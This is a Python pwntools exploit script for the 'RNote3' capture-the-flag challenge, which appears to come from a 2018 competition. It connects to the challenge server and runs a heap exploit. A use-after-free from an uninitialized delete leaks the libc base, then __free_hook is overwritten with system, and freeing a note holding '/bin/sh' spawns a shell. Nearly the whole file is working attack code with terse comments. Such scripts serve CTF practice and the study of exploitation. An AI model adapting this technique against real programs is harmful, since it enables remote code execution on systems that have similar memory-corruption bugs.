from pwn import *

g_local=False
e=ELF('./libc.so.6')
#context.log_level='debug'
if g_local:
	sh =process('./RNote3')#env={'LD_PRELOAD':'./libc.so.6'}
	#gdb.attach(sh)
else:
	sh = remote("rnote3.2018.teamrois.cn", 7322)

def add(title, size, content):
	assert title.find("\n") == -1 and content.find("\n") == -1 and len(content) < size
	sh.send("1\n")
	sh.recvuntil("please input title: ")
	sh.send(title + "\n")
	sh.recvuntil("please input content size: ")
	sh.send(str(size) + "\n")
	sh.recvuntil("please input content: ")
	sh.send(content + "\n")
	#sh.recv

def view(title):
	assert title.find("\n") == -1
	sh.send("2\n")
	sh.recvuntil("please input note title: ")
	sh.send(title + "\n")
	sh.recvuntil("note content: ")
	ret = sh.recvuntil("\n")
	return ret[:ret.find("\n")]

def edit(title, content):
	assert title.find("\n") == -1 and content.find("\n") == -1
	sh.send("3\n")
	sh.recvuntil("please input note title: ")
	sh.send(title + "\n")
	sh.recvuntil("please input new content: ")
	sh.send(content + "\n")

def delete(title):
	assert title.find("\n") == -1
	sh.send("4\n")
	sh.recvuntil("please input note title: ")
	sh.send(title + "\n")

#leak
# 	"1111", size 16
# 	"0000", size 256
# 	"2222", size 16

# 	delete "1111"
# 	delete "0000"

# 	"0000", size 256
# 	delete "undef", so "0000" being deleted
# 	"leak", size 16

# 	show "leak"
#now index 1 >=3 is empty
#

add("1111", 16, "/bin/sh\x00AAAAAAA")
add("0000", 256, "BBBBBBBBBBBBBBBB")
add("2222", 16, "CCCCCCCCCCCCCCC")
add("3333", 256, "DDDDDDDDDDDDDDDD")


#prevent allocate chunks from unsorted bin when leaking
delete("0000") # delete for alloc and uninitalized delete

add("0000", 256, "BBBBBBBBBBBBBBBB")
delete("undef") # now the one with title "0000" is UAF
delete("3333") # insert one chunk to fastbin
#however, after executing this, the fastbin of "0000" will be consolidated to unsorted bin
#with the chunk that is its content originally
#don't know why, but it does not matter

add("llll", 0x18, "leak")
# take fastbin top as new struct, used to leak
# in this way, the content of "llll" is the struct of "leak" that initially was "0000"
# and this chunk's content points to a freed chunk in unsorted bin!
libc_base = u64(view("leak")+"\x00\x00") - 0x3c4b78
print hex(libc_base)
payload = "leak" + p32(0) + p64(256) + p64(libc_base + e.symbols["__free_hook"])
edit("llll", payload[:len(payload) - 1]) # edit content of "llll", whici is struct of "leak"
edit("leak", p64(libc_base + e.symbols["system"])) #change free hook
delete("1111") #get shell
sh.interactive()